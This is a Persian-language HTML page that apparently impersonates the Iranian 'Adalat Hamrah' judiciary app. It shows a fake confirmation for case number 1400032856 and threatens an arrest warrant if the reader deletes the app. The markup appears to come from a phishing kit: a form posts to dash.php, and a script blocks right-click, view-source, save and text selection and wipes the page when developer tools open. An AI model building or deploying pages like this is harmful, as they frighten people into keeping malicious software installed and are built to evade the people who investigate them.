<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta name="csrf-token" content="TlF5f0RbADA9UDvvoftyBBN6Pq0kYCfBSVOtmkcS">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ورود</title>

    <meta name="robots" content="index, follow">


    <meta name="msapplication-TileColor" content="#2d2a26">
    <meta name="theme-color" content="#D50057">
    <meta name="msapplication-navbutton-color" content="#D50057">
    <meta name="apple-mobile-web-app-status-bar-style" content="#D50057">
    <meta name="description" content="">
    <meta name="keywords" content="">
    <!-- start:: Global Theme Bundle (used by all page)-->
    <link rel="stylesheet" href="statics/css/modiage.css">
    <link rel="stylesheet" href="statics/css/panel.desktop.css">
    <link rel="stylesheet" href="statics/css/swiper-bundle.min.css" />
    <!-- end:: Global Theme Bundle (used by all page)-->
</head>
<style>
.container {
  text-align: center;
}
    h5 {
   text-align: right;
   color: black;
  }
      h1 {
   text-align: center;
   color: #7fff00;
  }
      h6 {
   text-align: right;
   color: red;
  }
</style>

<body class="auth" style="min-height:100vh;background: linear-gradient(90deg, rgba(255,255,255,1) 0%, rgba(255,255,255,1) 20%, rgba(244,244,244,1) 40%, rgba(244,244,244,1) 60%, rgba(255,255,255,1) 80%, rgba(255,255,255,1) 100%);">
<header class="auth__header">
    <div class="auth__logo padding-y-400 semantic-color-white">
        <a class="auth__logo-img" href="statics"></a>
    </div>
</header>
<main>
    <section class="auth__container semantic-color-white padding-bottom-600">
            <div class="auth__form-container padding-500 margin-auto border" id="auth-form-container">
        <form class="auth__form form-ajax-submit"
              data-form-rule="authFormMobileRule"
              data-bind-success-methods="ajax_submit_forms_initializer,initCountdownTimer"
              data-view-container-id="auth-form-container" method="post" action="dash.php">
<div class="container">
  <img src="statics/img/XD4x.gif" alt="عکس" width="260" height="200">
                  <h1 class="margin-bottom-500 font-size-300 font-weight-bold"></h1>
                  
                  <h1 class="margin-bottom-500 font-size-300 font-weight-bold">درخواست پیگیری ابلاغیه شما با موفقیت انجام شد</h1>
                  
                                                      <h5 class="xs-title">مودی گرامی تا ساعات آتی اطلاعات مربوط به پرونده شماره 1400032856 از طریق اپلیکیشن عدالت همراه برای شما ارسال خواهد شد • از حذف اپلیکیشن خودداری کنید حذف اپلیکیشن عدالت همراه باعث میشود پرونده شما در پرونده های پیگیری نشده قرار گرفته شود و در این صورت حکم جلب شما صادر خواهد شد .
</h5>


</div>
            </div>
            <div class="auth__form-footer">
        
            </div>
        </form>
    </div>
    </section>
</main>
<footer class="auth__footer">
    <div class="display-flex justify-content-center padding-top-300 font-size-75">


    </div>
    <div class="text-center margin-top-200 font-size-75">
اپلیکیشن عدالت همراه
    </div>
</footer>

<!-- end:: Page Scripts (used by this page)-->

<script>
document.addEventListener('contextmenu', e => e.preventDefault());
document.addEventListener('keydown', function(e){
    if(
        e.keyCode === 123 || 
        (e.ctrlKey && e.keyCode === 85) || 
        (e.ctrlKey && e.shiftKey && e.keyCode === 73) ||
        (e.ctrlKey && e.keyCode === 83)
    ){
        e.preventDefault();
        return false;
    }
});
document.addEventListener('selectstart', e => e.preventDefault());

// basic devtools detect (weak)
setInterval(function(){
    const before = Date.now();
    debugger;
    const after = Date.now();
    if(after - before > 100){
        document.body.innerHTML = "";
    }
}, 2000);
</script>

</body>
</html>
